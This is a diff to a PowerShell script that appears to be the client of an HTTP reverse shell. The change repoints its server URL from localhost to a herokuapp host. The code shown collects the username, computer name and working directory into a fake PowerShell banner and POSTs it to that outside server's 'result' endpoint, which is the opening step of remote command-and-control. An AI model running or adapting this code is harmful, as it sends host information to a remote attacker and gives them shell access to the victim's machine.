@@ -1,7 +1,7 @@
 # Copyright (c) 2017 Andrea Fioraldi
 # License http://opensource.org/licenses/mit-license.php MIT License
 
-$__url = "http://127.0.0.1:5000/"
+$__url = "https://reverse80.herokuapp.com/"
 
 $__params = @{output = "Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`nPS " + (pwd).Path + "> "}
 $__dumb = Invoke-WebRequest -UseBasicParsing -Uri ($__url + "result") -Method POST -Body $__params
